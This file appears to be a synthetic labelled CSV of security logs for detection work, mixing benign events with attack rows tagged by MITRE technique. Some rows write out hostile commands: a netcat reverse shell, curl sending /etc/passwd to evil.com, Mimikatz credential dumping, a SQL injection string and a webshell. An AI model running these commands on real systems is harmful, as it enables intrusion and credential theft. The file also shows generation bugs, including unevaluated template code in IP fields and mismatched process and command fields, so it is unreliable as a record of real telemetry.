@timestamp,label,attack_name,mitre_technique,mitre_tactic,event.category,event.outcome,source.ip,source.port,destination.ip,destination.port,network.bytes,network.packets,agent.hostname,agent.type,user.name,process.pid,process.name,process.command_line,file_name,domain
2026-09-14T03:07:35.563082,benign,,,,authentication,success,192.168.1.6,8443,10.0.1.169,80,6295,81,web100,windows,mark.wilson,3850,sshd,explorer.exe,,
2026-09-13T21:32:39.563926,benign,,,,network,success,192.168.1.72,5000,10.0.2.19,80,5051,22,web20,windows,john.doe,1321,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-08T19:20:08.570695,benign,,,,authentication,success,192.168.1.95,5000,10.0.0.133,22,6951,25,app2,linux,john.doe,408,systemd,chrome.exe --profile-directory=Default,,
2026-09-12T11:50:02.564658,benign,,,,file,success,192.168.1.251,4096,10.0.4.132,22,4599,79,db3,linux,mark.wilson,8910,sshd,apache2 -DFOREGROUND,,
2026-09-09T07:00:22.568236,benign,,,,network,success,192.168.1.196,5000,10.0.2.97,443,9073,15,srv10,linux,chris.miller,6403,systemd,chrome.exe --profile-directory=Default,,
2026-09-12T18:39:44.560037,benign,,,,authentication,success,192.168.1.108,8443,10.0.4.132,22,4469,55,srv20,linux,jane.smith,9264,explorer.exe,explorer.exe,,
2026-09-15T09:04:12.558386,benign,,,,process,success,192.168.1.2,2048,10.0.5.240,80,7713,5,backup4,windows,jane.smith,306,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-12T10:54:22.562273,benign,,,,network,success,192.168.1.220,4096,10.0.3.7,80,3947,51,workstation10,linux,lisa.wilson,8698,explorer.exe,firefox.exe,,
2026-09-09T04:13:34.557856,benign,,,,authentication,success,192.168.1.155,8443,10.0.0.233,22,2273,66,srv50,linux,sarah.jones,758,nginx,firefox.exe,,
2026-09-11T00:37:17.555945,benign,,,,file,success,192.168.1.166,2048,10.0.0.166,80,776,34,srv5,windows,john.doe,1989,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-12T07:38:09.548152,attack,port_scan,T1046,discovery,network,success,192.168.56.10,6407,"10.0.0.{random.randint(1, 254)}",443,4326,35,app20,windows,administrator,7405,python3,,,
2026-09-13T02:02:54.564709,benign,,,,network,success,192.168.1.182,1024,10.0.0.133,443,7141,1,db5,linux,john.doe,4358,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-15T12:06:14.569387,benign,,,,authentication,success,192.168.1.149,5000,10.0.1.168,3306,3120,11,srv10,linux,chris.miller,9600,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-14T22:09:20.570840,benign,,,,network,success,192.168.1.74,5000,10.0.5.59,3306,8240,62,db10,linux,sarah.jones,9954,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-10T10:09:42.550949,benign,,,,network,success,192.168.1.134,1024,10.0.3.137,3306,5172,38,web3,windows,admin,3159,chrome.exe,apache2 -DFOREGROUND,,
2026-09-12T23:24:12.540313,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.3,54383,"10.0.0.{random.randint(1, 254)}",443,4159,87,backup4,linux,administrator,8449,python3,,,evil-c2.com
2026-09-09T18:08:46.557896,benign,,,,authentication,success,192.168.1.108,4096,10.0.0.46,443,7563,98,backup3,linux,mark.wilson,6434,nginx,firefox.exe,,
2026-09-09T16:22:54.557612,benign,,,,network,success,192.168.1.102,1024,10.0.0.220,443,3211,19,web1,windows,mike.brown,819,apache2,explorer.exe,,
2026-09-09T05:54:23.562863,benign,,,,network,success,192.168.1.159,3072,10.0.1.160,22,781,15,srv5,windows,emily.davis,1111,systemd,firefox.exe,,
2026-09-12T14:05:01.541061,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.7,21017,"10.0.0.{random.randint(1, 254)}",443,1756,82,workstation100,linux,root,3452,powershell.exe,,,evil-c2.com
2026-09-10T07:43:59.552613,benign,,,,network,success,192.168.1.196,8443,10.0.2.237,22,2009,46,backup100,linux,mike.brown,6898,apache2,apache2 -DFOREGROUND,,
2026-09-12T22:02:35.559449,benign,,,,network,success,192.168.1.75,5000,10.0.1.147,443,1039,46,srv3,linux,sarah.jones,2612,firefox.exe,explorer.exe,,
2026-09-09T06:18:45.545015,attack,port_scan,T1046,discovery,network,success,192.168.56.4,59485,"10.0.0.{random.randint(1, 254)}",443,2212,26,mail100,windows,administrator,8408,cmd.exe,,,
2026-09-13T01:40:52.546552,attack,reverse_shell,T1059,execution,process,success,192.168.56.7,63951,"10.0.0.{random.randint(1, 254)}",4444,2610,6,db4,linux,test,2534,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-15T03:07:01.541099,attack,port_scan,T1046,discovery,network,success,192.168.56.8,50758,"10.0.0.{random.randint(1, 254)}",3306,2960,6,app2,linux,guest,4706,powershell.exe,,,
2026-09-12T13:19:03.562349,benign,,,,file,success,192.168.1.194,2048,10.0.4.135,443,790,37,mail50,windows,mark.wilson,6378,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-09T12:31:09.546145,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.6,60877,"10.0.0.{random.randint(1, 254)}",8080,53964,111,web100,linux,test,6793,cmd.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-11T19:33:12.549200,benign,,,,network,success,192.168.1.10,1024,10.0.0.89,53,4981,59,srv50,windows,sarah.jones,954,firefox.exe,apache2 -DFOREGROUND,,
2026-09-12T13:38:42.558620,benign,,,,network,success,192.168.1.185,4096,10.0.2.145,80,5815,40,backup20,linux,emily.davis,9582,systemd,firefox.exe,,
2026-09-12T15:08:31.552142,benign,,,,network,success,192.168.1.152,2048,10.0.1.62,3306,5783,76,mail3,windows,david.moore,5666,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-12T04:14:32.561148,benign,,,,process,success,192.168.1.22,4096,10.0.4.181,53,1042,56,db10,linux,admin,3929,nginx,chrome.exe --profile-directory=Default,,
2026-09-09T07:04:29.550606,benign,,,,authentication,success,192.168.1.149,4096,10.0.0.4,53,713,66,app100,windows,chris.miller,3630,nginx,firefox.exe,,
2026-09-11T12:10:25.556678,benign,,,,network,success,192.168.1.249,5000,10.0.2.94,53,3075,21,web100,windows,lisa.wilson,1522,firefox.exe,firefox.exe,,
2026-09-14T14:55:29.558803,benign,,,,process,success,192.168.1.201,2048,10.0.0.127,53,7943,69,srv10,linux,emily.davis,8526,apache2,apache2 -DFOREGROUND,,
2026-09-12T03:47:34.542917,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.2,37631,"10.0.0.{random.randint(1, 254)}",443,3553,55,app50,windows,administrator,8084,cmd.exe,,,evil-c2.com
2026-09-09T20:47:42.560343,benign,,,,network,success,192.168.1.38,1024,10.0.3.201,80,4063,7,backup2,linux,mike.brown,9120,sshd,firefox.exe,,
2026-09-15T14:49:35.565714,benign,,,,authentication,success,192.168.1.120,3072,10.0.4.219,3306,4335,50,backup5,linux,admin,7477,sshd,chrome.exe --profile-directory=Default,,
2026-09-14T16:19:22.561645,benign,,,,process,success,192.168.1.34,1024,10.0.3.164,22,9117,58,web10,windows,david.moore,5999,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-12T20:17:52.541785,attack,webshell,T1505,persistence,file,success,192.168.56.8,0,"10.0.0.{random.randint(1, 254)}",0,8361,1,workstation50,windows,guest,8982,php,php /var/www/html/shell.php,shell.php,
2026-09-11T04:15:23.550171,benign,,,,file,success,192.168.1.22,8443,10.0.5.24,53,3420,48,app5,linux,sarah.jones,4263,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-13T02:40:20.569072,benign,,,,network,success,192.168.1.16,4096,10.0.2.55,3306,2875,87,app100,linux,chris.miller,1251,systemd,explorer.exe,,
2026-09-11T01:22:01.557850,benign,,,,network,success,192.168.1.114,4096,10.0.3.80,22,8032,46,web100,linux,chris.miller,210,sshd,firefox.exe,,
2026-09-11T07:07:36.551606,benign,,,,authentication,success,192.168.1.65,3072,10.0.5.155,22,4207,86,workstation3,windows,mike.brown,335,explorer.exe,apache2 -DFOREGROUND,,
2026-09-15T17:13:24.540826,attack,credential_dump,T1003,credential_access,process,success,192.168.56.3,0,"10.0.0.{random.randint(1, 254)}",0,2606,1,db4,windows,guest,152,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-15T14:46:24.557340,benign,,,,network,success,192.168.1.182,4096,10.0.0.132,53,5327,56,workstation10,linux,lisa.wilson,7662,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-09T15:47:52.562106,benign,,,,authentication,success,192.168.1.14,2048,10.0.3.143,80,1776,1,workstation1,windows,admin,6509,sshd,chrome.exe --profile-directory=Default,,
2026-09-15T00:10:03.562990,benign,,,,network,success,192.168.1.97,1024,10.0.4.165,443,9911,70,backup20,windows,lisa.wilson,1457,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-14T22:48:28.562844,benign,,,,authentication,success,192.168.1.73,8443,10.0.4.100,80,8303,51,srv100,windows,mark.wilson,6067,explorer.exe,firefox.exe,,
2026-09-13T18:25:13.543235,attack,reverse_shell,T1059,execution,process,success,192.168.56.4,12246,"10.0.0.{random.randint(1, 254)}",4444,390,22,workstation3,windows,administrator,6680,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-13T08:11:32.551107,benign,,,,process,success,192.168.1.191,3072,10.0.1.243,80,7653,50,workstation20,linux,sarah.jones,389,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-10T00:01:18.544039,attack,reverse_shell,T1059,execution,process,success,192.168.56.6,3032,"10.0.0.{random.randint(1, 254)}",4444,3665,21,srv10,linux,admin,6823,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-13T11:33:26.563725,benign,,,,network,success,192.168.1.107,4096,10.0.0.248,3306,8618,34,backup100,windows,emily.davis,7311,nginx,chrome.exe --profile-directory=Default,,
2026-09-15T12:34:48.564932,benign,,,,authentication,success,192.168.1.139,3072,10.0.1.85,22,3704,76,web1,linux,lisa.wilson,5870,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-12T10:53:00.569346,benign,,,,file,success,192.168.1.155,1024,10.0.3.147,53,2757,43,app50,linux,mike.brown,621,sshd,explorer.exe,,
2026-09-09T00:47:21.552074,benign,,,,authentication,success,192.168.1.180,1024,10.0.3.50,22,891,2,mail4,windows,mark.wilson,2933,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-10T02:05:37.546376,attack,credential_dump,T1003,credential_access,process,success,192.168.56.7,0,"10.0.0.{random.randint(1, 254)}",0,5541,5,workstation4,windows,test,5040,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-10T18:49:16.544949,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.6,23681,"10.0.0.{random.randint(1, 254)}",443,7562,27,db50,linux,guest,2923,powershell.exe,,,evil-c2.com
2026-09-11T07:48:29.557347,benign,,,,authentication,success,192.168.1.179,5000,10.0.4.182,80,8815,84,srv20,windows,admin,9668,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-15T01:48:02.563994,benign,,,,network,success,192.168.1.136,1024,10.0.5.121,22,6621,16,workstation20,windows,mike.brown,7984,systemd,explorer.exe,,
2026-09-14T23:40:41.567586,benign,,,,authentication,success,192.168.1.236,2048,10.0.1.141,80,2189,55,backup5,windows,lisa.wilson,2710,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-09T17:55:59.564608,benign,,,,process,success,192.168.1.141,1024,10.0.0.18,443,6362,44,web2,linux,lisa.wilson,4028,nginx,firefox.exe,,
2026-09-10T01:23:39.544558,attack,reverse_shell,T1059,execution,process,success,192.168.56.2,3394,"10.0.0.{random.randint(1, 254)}",4444,2554,43,srv20,windows,root,5980,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-10T21:20:24.557121,benign,,,,authentication,success,192.168.1.173,3072,10.0.1.53,53,3508,4,workstation1,windows,sarah.jones,6851,firefox.exe,apache2 -DFOREGROUND,,
2026-09-11T13:13:05.567253,benign,,,,network,success,192.168.1.137,2048,10.0.0.130,3306,7158,53,backup2,linux,mark.wilson,2647,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-11T09:45:42.560378,benign,,,,network,success,192.168.1.102,5000,10.0.2.133,53,2642,22,mail2,windows,lisa.wilson,3752,nginx,explorer.exe,,
2026-09-09T18:41:49.553212,benign,,,,network,success,192.168.1.224,5000,10.0.4.142,3306,5306,20,db5,linux,emily.davis,1281,sshd,chrome.exe --profile-directory=Default,,
2026-09-14T21:52:28.554544,benign,,,,authentication,success,192.168.1.193,1024,10.0.1.140,443,9239,7,srv2,linux,jane.smith,633,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-09T22:37:04.561195,benign,,,,authentication,success,192.168.1.90,1024,10.0.1.155,443,1536,31,srv1,windows,sarah.jones,8256,chrome.exe,apache2 -DFOREGROUND,,
2026-09-13T12:13:03.565143,benign,,,,network,success,192.168.1.183,4096,10.0.1.130,443,8502,69,backup50,linux,admin,594,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-08T18:18:00.545386,attack,port_scan,T1046,discovery,network,success,192.168.56.9,48571,"10.0.0.{random.randint(1, 254)}",3389,3333,12,mail2,linux,root,857,powershell.exe,,,
2026-09-12T16:25:08.559463,benign,,,,authentication,success,192.168.1.65,5000,10.0.2.135,3306,4491,42,srv10,windows,mike.brown,1638,nginx,explorer.exe,,
2026-09-14T12:16:12.545863,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.3,11707,"10.0.0.{random.randint(1, 254)}",22,1105,6,db1,windows,test,2191,bash,,,
2026-09-08T21:32:25.562791,benign,,,,authentication,success,192.168.1.127,1024,10.0.2.147,443,4273,3,workstation2,windows,sarah.jones,7136,firefox.exe,firefox.exe,,
2026-09-13T00:10:37.555304,benign,,,,network,success,192.168.1.195,8443,10.0.2.253,3306,1287,49,workstation3,linux,jane.smith,1585,apache2,chrome.exe --profile-directory=Default,,
2026-09-14T06:13:20.565727,benign,,,,network,success,192.168.1.61,4096,10.0.2.24,80,8378,58,backup5,linux,admin,1897,systemd,chrome.exe --profile-directory=Default,,
2026-09-10T19:31:40.554626,benign,,,,authentication,success,192.168.1.172,3072,10.0.0.185,53,3958,9,workstation1,linux,admin,6900,systemd,apache2 -DFOREGROUND,,
2026-09-15T00:46:09.570452,benign,,,,authentication,success,192.168.1.238,5000,10.0.5.49,3306,1411,79,app50,linux,sarah.jones,1488,explorer.exe,explorer.exe,,
2026-09-08T23:19:45.540452,attack,webshell,T1505,persistence,file,success,192.168.56.8,0,"10.0.0.{random.randint(1, 254)}",0,1338,7,workstation5,linux,administrator,853,php,php /var/www/html/shell.php,shell.php,
2026-09-14T16:45:53.563686,benign,,,,network,success,192.168.1.100,3072,10.0.5.222,80,9934,21,backup2,linux,mike.brown,8851,sshd,firefox.exe,,
2026-09-10T04:49:46.545976,attack,sql_injection,T1190,initial_access,web,success,192.168.56.7,41606,"10.0.0.{random.randint(1, 254)}",80,1856,13,backup1,linux,root,9632,powershell.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-13T07:36:31.549568,benign,,,,network,success,192.168.1.181,2048,10.0.5.111,53,9164,96,mail20,linux,sarah.jones,5503,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-14T00:20:25.544315,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.1,53059,"10.0.0.{random.randint(1, 254)}",22,1462,19,web4,linux,guest,5161,powershell.exe,,,
2026-09-14T17:33:31.568807,benign,,,,process,success,192.168.1.44,2048,10.0.4.84,443,2789,60,workstation50,linux,chris.miller,1531,nginx,explorer.exe,,
2026-09-14T01:04:09.560251,benign,,,,authentication,success,192.168.1.85,4096,10.0.4.185,443,2207,98,web50,windows,admin,9625,sshd,chrome.exe --profile-directory=Default,,
2026-09-14T16:13:41.549394,benign,,,,authentication,success,192.168.1.3,1024,10.0.0.252,80,4301,73,workstation2,windows,mike.brown,4238,sshd,firefox.exe,,
2026-09-14T14:20:06.559398,benign,,,,network,success,192.168.1.161,1024,10.0.1.221,3306,5581,78,web3,windows,david.moore,4258,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-13T04:38:04.556637,benign,,,,authentication,success,192.168.1.229,1024,10.0.5.91,80,9862,91,db20,linux,lisa.wilson,1785,apache2,firefox.exe,,
2026-09-13T15:53:59.556746,benign,,,,network,success,192.168.1.189,2048,10.0.5.159,80,8686,44,mail2,windows,admin,1917,nginx,explorer.exe,,
2026-09-11T09:52:38.541890,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.5,5900,"10.0.0.{random.randint(1, 254)}",22,1792,3,db20,windows,guest,4632,cmd.exe,,,
2026-09-09T18:06:54.554425,benign,,,,authentication,success,192.168.1.200,4096,10.0.4.179,3306,6902,77,app5,linux,mike.brown,8229,explorer.exe,explorer.exe,,
2026-09-15T09:54:09.543889,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.2,50226,"10.0.0.{random.randint(1, 254)}",443,8337,84,app1,windows,root,289,bash,,,evil-c2.com
2026-09-12T16:06:35.563579,benign,,,,network,success,192.168.1.116,3072,10.0.5.14,80,7920,69,workstation100,linux,jane.smith,7424,nginx,firefox.exe,,
2026-09-11T10:19:39.547249,attack,webshell,T1505,persistence,file,success,192.168.56.2,0,"10.0.0.{random.randint(1, 254)}",0,3145,9,mail20,linux,guest,4743,php,php /var/www/html/shell.php,shell.php,
2026-09-15T14:36:20.568439,benign,,,,process,success,192.168.1.111,8443,10.0.0.246,3306,7027,69,mail100,windows,john.doe,6822,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-13T12:56:34.541523,attack,reverse_shell,T1059,execution,process,success,192.168.56.9,41435,"10.0.0.{random.randint(1, 254)}",4444,3871,7,web4,linux,test,4289,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-15T11:12:32.560264,benign,,,,process,success,192.168.1.205,4096,10.0.3.163,53,7708,80,web100,linux,emily.davis,4586,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-09T11:01:32.559990,benign,,,,network,success,192.168.1.56,2048,10.0.1.128,22,2994,82,web100,windows,david.moore,2556,sshd,firefox.exe,,
2026-09-15T09:58:20.544090,attack,webshell,T1505,persistence,file,success,192.168.56.8,0,"10.0.0.{random.randint(1, 254)}",0,9762,1,db100,windows,root,3704,php,php /var/www/html/shell.php,shell.php,
2026-09-08T23:51:46.557036,benign,,,,network,success,192.168.1.140,8443,10.0.1.44,53,6345,71,srv10,windows,john.doe,9153,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-12T19:06:24.570603,benign,,,,file,success,192.168.1.142,4096,10.0.1.220,80,8814,5,backup2,linux,sarah.jones,8568,chrome.exe,firefox.exe,,
2026-09-14T04:27:05.545695,attack,sql_injection,T1190,initial_access,web,success,192.168.56.7,40730,"10.0.0.{random.randint(1, 254)}",80,2836,32,workstation5,linux,guest,1776,cmd.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-10T22:18:14.543783,attack,credential_dump,T1003,credential_access,process,success,192.168.56.1,0,"10.0.0.{random.randint(1, 254)}",0,2727,1,backup50,linux,guest,2291,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-13T12:06:39.565825,benign,,,,network,success,192.168.1.222,2048,10.0.4.48,443,9071,9,backup100,linux,lisa.wilson,6813,chrome.exe,firefox.exe,,
2026-09-14T18:27:07.565732,benign,,,,network,success,192.168.1.220,8443,10.0.5.189,80,7984,22,srv50,windows,emily.davis,6202,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-14T12:11:00.547603,attack,credential_dump,T1003,credential_access,process,success,192.168.56.3,0,"10.0.0.{random.randint(1, 254)}",0,5338,2,mail50,windows,test,1695,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-13T23:09:17.550760,benign,,,,process,success,192.168.1.127,5000,10.0.2.11,22,2771,44,srv2,windows,david.moore,3085,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-14T23:13:38.553112,benign,,,,authentication,success,192.168.1.250,5000,10.0.0.64,22,1471,22,backup1,linux,jane.smith,2340,nginx,firefox.exe,,
2026-09-09T08:27:06.548142,attack,port_scan,T1046,discovery,network,success,192.168.56.1,2130,"10.0.0.{random.randint(1, 254)}",22,4126,9,workstation1,windows,guest,3987,powershell.exe,,,
2026-09-10T01:44:03.550439,benign,,,,file,success,192.168.1.237,3072,10.0.1.150,3306,6103,26,backup100,windows,jane.smith,1733,nginx,firefox.exe,,
2026-09-09T14:15:23.569656,benign,,,,process,success,192.168.1.254,8443,10.0.5.166,80,245,98,srv3,linux,emily.davis,8217,systemd,apache2 -DFOREGROUND,,
2026-09-15T09:49:12.569564,benign,,,,process,success,192.168.1.23,8443,10.0.4.83,80,3016,12,srv4,windows,john.doe,4809,chrome.exe,apache2 -DFOREGROUND,,
2026-09-14T15:33:42.565986,benign,,,,process,success,192.168.1.249,5000,10.0.4.41,3306,2034,81,backup50,linux,john.doe,6578,sshd,sshd: /usr/sbin/sshd [listener],,
